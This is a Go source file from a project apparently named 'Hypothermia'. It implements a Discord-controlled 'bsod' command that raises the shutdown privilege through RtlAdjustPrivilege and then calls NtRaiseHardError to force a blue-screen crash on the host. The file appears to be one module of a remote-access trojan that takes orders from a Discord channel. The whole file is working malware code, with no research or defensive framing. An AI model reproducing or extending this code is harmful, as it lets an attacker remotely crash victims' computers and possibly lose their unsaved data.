package commands

import (
	"fmt"
	"syscall"
	"unsafe"

	"Hypothermia/src/misc"
	"github.com/bwmarrin/discordgo"
)

const bsodRaiseError string = "🟥 Failed to raise error: %s"

var raiseHardError *syscall.LazyProc = misc.NTdll.NewProc("NtRaiseHardError")

func (*BSODCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	var old int32
	var res uint32

	ret, _, err := misc.AdjustPrivilege.Call(
		uintptr(19),
		uintptr(1),
		uintptr(0),
		uintptr(unsafe.Pointer(&old)),
	)

	if ret != 0 {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.ERROR_F_ADJUST_PRIVILEGE, err), m.Reference())
		return
	}

	ret, _, err = raiseHardError.Call(
		uintptr(0xC000007B),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(6),
		uintptr(unsafe.Pointer(&res)),
	)

	if ret != 0 {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(bsodRaiseError, err), m.Reference())
		return
	}
}

func (*BSODCommand) Name() string {
	return "bsod"
}

func (*BSODCommand) Info() string {
	return "triggers the blue screen of death"
}

type BSODCommand struct{}
